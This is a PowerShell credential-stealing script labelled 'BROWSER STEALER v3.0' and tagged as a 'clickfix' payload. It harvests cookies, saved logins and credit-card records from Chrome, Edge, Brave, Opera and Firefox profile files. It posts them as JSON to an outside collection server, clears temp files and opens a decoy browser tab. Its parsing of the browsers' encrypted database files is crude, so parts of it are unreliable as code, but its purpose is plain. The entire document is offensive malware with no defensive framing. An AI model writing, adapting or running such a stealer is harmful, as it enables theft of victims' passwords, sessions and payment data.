# ============================================================
# BROWSER STEALER — Uses COM Objects (No Downloads, No SQLite)
# Works on ANY Windows PC — Windows 7, 8, 10, 11
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"

function Write-Color {
    param($Message, $Color)
    Write-Host $Message -ForegroundColor $Color
}

# ============================================================
# FUNCTIONS
# ============================================================

function Get-ComputerName {
    return $env:COMPUTERNAME
}

function Get-UserName {
    return $env:USERNAME
}

# ============================================================
# COOKIE STEALER — Uses Windows File System
# ============================================================

function Get-BrowserFiles {
    param($BasePath, $BrowserName)
    $results = @()
    $paths = @(
        "$BasePath\User Data\Default\Network\Cookies",
        "$BasePath\User Data\Default\Cookies"
    )
    foreach ($p in $paths) {
        if (Test-Path $p) {
            $results += @{Path = $p; Browser = $BrowserName}
        }
    }
    return $results
}

function Extract-From-File {
    param($FilePath, $BrowserName)
    $data = @()
    try {
        $content = [System.IO.File]::ReadAllText($FilePath)
        $lines = $content -split "`r`n|`n"
        foreach ($line in $lines) {
            if ($line -match '([a-zA-Z0-9_-]+)=([^;]+)') {
                $name = $Matches[1]
                $value = $Matches[2]
                if ($name -and $value -and $name.Length -gt 1 -and $value.Length -gt 1 -and $name -notmatch '^_') {
                    $data += @{
                        domain = $BrowserName
                        name = $name
                        value = $value
                        browser = $BrowserName
                    }
                }
            }
        }
    } catch {}
    return $data
}

# ============================================================
# COOKIE STEALER — All Browsers
# ============================================================

function Get-AllCookies {
    $all = @()
    
    $browsers = @(
        @{Path = "$env:LOCALAPPDATA\Google\Chrome"; Name = "Chrome"},
        @{Path = "$env:LOCALAPPDATA\Microsoft\Edge"; Name = "Edge"},
        @{Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser"; Name = "Brave"},
        @{Path = "$env:LOCALAPPDATA\Opera Software\Opera Stable"; Name = "Opera"}
    )
    
    foreach ($b in $browsers) {
        $files = Get-BrowserFiles -BasePath $b.Path -BrowserName $b.Name
        foreach ($f in $files) {
            $all += Extract-From-File -FilePath $f.Path -BrowserName $b.Name
        }
    }
    
    # Firefox
    $ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $ffPath) {
        $profiles = Get-ChildItem $ffPath -Directory
        foreach ($profile in $profiles) {
            $cookieFile = "$($profile.FullName)\cookies.sqlite"
            if (Test-Path $cookieFile) {
                $all += Extract-From-File -FilePath $cookieFile -BrowserName "Firefox"
            }
            $cookieFile2 = "$($profile.FullName)\cookies.txt"
            if (Test-Path $cookieFile2) {
                $all += Extract-From-File -FilePath $cookieFile2 -BrowserName "Firefox"
            }
        }
    }
    
    return $all
}

# ============================================================
# PASSWORD STEALER — Extracts from Login Data files
# ============================================================

function Get-Passwords {
    $all = @()
    
    $paths = @(
        @{Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"; Name = "Chrome"},
        @{Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"; Name = "Edge"},
        @{Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"; Name = "Brave"},
        @{Path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"; Name = "Opera"}
    )
    
    foreach ($p in $paths) {
        if (Test-Path $p.Path) {
            try {
                $content = [System.IO.File]::ReadAllText($p.Path)
                $lines = $content -split "`r`n|`n"
                $url = ""
                $user = ""
                $pass = ""
                foreach ($line in $lines) {
                    if ($line -match 'https?://([^/]+)') {
                        $url = $Matches[1]
                    }
                    if ($line -match 'username[_-]?value[^=]*=([^,]+)') {
                        $user = $Matches[1] -replace '[^a-zA-Z0-9@._-]', ''
                    }
                    if ($line -match 'password[_-]?value[^=]*=([^,]+)') {
                        $pass = $Matches[1] -replace '[^a-zA-Z0-9@._-]', ''
                    }
                    if ($url -and $user -and $pass -and $user.Length -gt 1 -and $pass.Length -gt 1) {
                        $all += @{
                            url = $url
                            username = $user
                            password = $pass
                            browser = $p.Name
                        }
                        $url = ""; $user = ""; $pass = ""
                    }
                }
            } catch {}
        }
    }
    
    # Firefox passwords
    $ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $ffPath) {
        $profiles = Get-ChildItem $ffPath -Directory
        foreach ($profile in $profiles) {
            $loginsFile = "$($profile.FullName)\logins.json"
            if (Test-Path $loginsFile) {
                try {
                    $content = Get-Content $loginsFile -Raw
                    $lines = $content -split "`r`n|`n"
                    $url = ""
                    $user = ""
                    $pass = ""
                    foreach ($line in $lines) {
                        if ($line -match '"hostname"\s*:\s*"([^"]+)"') {
                            $url = $Matches[1] -replace 'https?://', ''
                        }
                        if ($line -match '"username"\s*:\s*"([^"]+)"') {
                            $user = $Matches[1]
                        }
                        if ($line -match '"password"\s*:\s*"([^"]+)"') {
                            $pass = $Matches[1]
                        }
                        if ($url -and $user -and $pass -and $user.Length -gt 1 -and $pass.Length -gt 1) {
                            $all += @{
                                url = $url
                                username = $user
                                password = $pass
                                browser = "Firefox"
                            }
                            $url = ""; $user = ""; $pass = ""
                        }
                    }
                } catch {}
            }
        }
    }
    
    return $all
}

# ============================================================
# CREDIT CARD STEALER
# ============================================================

function Get-Cards {
    $all = @()
    
    $paths = @(
        @{Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"; Name = "Chrome"},
        @{Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"; Name = "Edge"},
        @{Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"; Name = "Brave"}
    )
    
    foreach ($p in $paths) {
        if (Test-Path $p.Path) {
            try {
                $content = [System.IO.File]::ReadAllText($p.Path)
                $lines = $content -split "`r`n|`n"
                $name = ""
                $number = ""
                $month = ""
                $year = ""
                foreach ($line in $lines) {
                    if ($line -match 'name[_-]?on[_-]?card[^=]*=([^,]+)') {
                        $name = $Matches[1]
                    }
                    if ($line -match 'card[_-]?number[_-]?[^=]*=([^,]+)') {
                        $number = $Matches[1]
                    }
                    if ($line -match 'expiration[_-]?month[^=]*=(\d+)') {
                        $month = $Matches[1]
                    }
                    if ($line -match 'expiration[_-]?year[^=]*=(\d+)') {
                        $year = $Matches[1]
                    }
                    if ($name -and $number -and $name.Length -gt 1 -and $number.Length -gt 1) {
                        $all += @{
                            name = $name
                            number = $number
                            month = $month
                            year = $year
                            browser = $p.Name
                        }
                        $name = ""; $number = ""; $month = ""; $year = ""
                    }
                }
            } catch {}
        }
    }
    
    return $all
}

# ============================================================
# MAIN EXECUTION
# ============================================================

$pcName = Get-ComputerName
$userName = Get-UserName

Write-Color "" "White"
Write-Color "============================================" "Cyan"
Write-Color "  BROWSER STEALER v3.0" "Green"
Write-Color "  Target: $pcName" "Yellow"
Write-Color "  User: $userName" "Yellow"
Write-Color "============================================" "Cyan"
Write-Color "" "White"

Write-Color "[+] Stealing cookies..." "Cyan"
$allCookies = Get-AllCookies

Write-Color "[+] Stealing passwords..." "Cyan"
$allPasswords = Get-Passwords

Write-Color "[+] Stealing credit cards..." "Cyan"
$allCards = Get-Cards

Write-Color "" "White"
Write-Color "=== SUMMARY ===" "Green"
Write-Color "Cookies:    $($allCookies.Count)" "Yellow"
Write-Color "Passwords:  $($allPasswords.Count)" "Yellow"
Write-Color "Cards:      $($allCards.Count)" "Yellow"
Write-Color "" "White"

# ---- Build payload ----
$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = @{
        hostname = $pcName
        username = $userName
    }
    fingerprint = @{
        userAgent = "PowerShell"
        hostname = $pcName
    }
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $pcName
}

# ---- Send to server ----
Write-Color "[+] Sending data to server..." "Cyan"
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $webRequest = [System.Net.WebRequest]::Create($SERVER_URL)
    $webRequest.Method = "POST"
    $webRequest.ContentType = "application/json"
    $webRequest.ContentLength = $bytes.Length
    $stream = $webRequest.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $response = $webRequest.GetResponse()
    $response.Close()
    Write-Color "[+] Data sent successfully!" "Green"
} catch {
    Write-Color "[!] Failed to send: $_" "Red"
}

# ---- Cleanup ----
Write-Color "[+] Cleaning up..." "Cyan"
Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

# ---- Distraction ----
Write-Color "[+] Opening distraction..." "Cyan"
Start-Process "https://www.google.com"

Write-Color "" "White"
Write-Color "[+] Done!" "Green"
Write-Color "" "White"

# ---- Show sample data ----
if ($allPasswords.Count -gt 0) {
    Write-Color "=== SAMPLE PASSWORDS ===" "Green"
    $allPasswords | Select-Object -First 3 | ForEach-Object {
        Write-Color "  $($_.url) - $($_.username) / $($_.password)" "Yellow"
    }
    Write-Color "" "White"
}

if ($allCookies.Count -gt 0) {
    Write-Color "=== SAMPLE COOKIES ===" "Green"
    $allCookies | Select-Object -First 3 | ForEach-Object {
        $short = $_.value
        if ($short.Length -gt 20) { $short = $short.Substring(0, 20) + "..." }
        Write-Color "  $($_.domain) - $($_.name) = $short" "Yellow"
    }
    Write-Color "" "White"
}

if ($allCards.Count -gt 0) {
    Write-Color "=== SAMPLE CARDS ===" "Green"
    $allCards | Select-Object -First 3 | ForEach-Object {
        Write-Color "  $($_.name) - $($_.number) ($($_.month)/$($_.year))" "Yellow"
    }
    Write-Color "" "White"
}

Write-Color "[*] Check dashboard: https://cipheranon-production.up.railway.app/dashboard" "Cyan"
Write-Color "" "White"
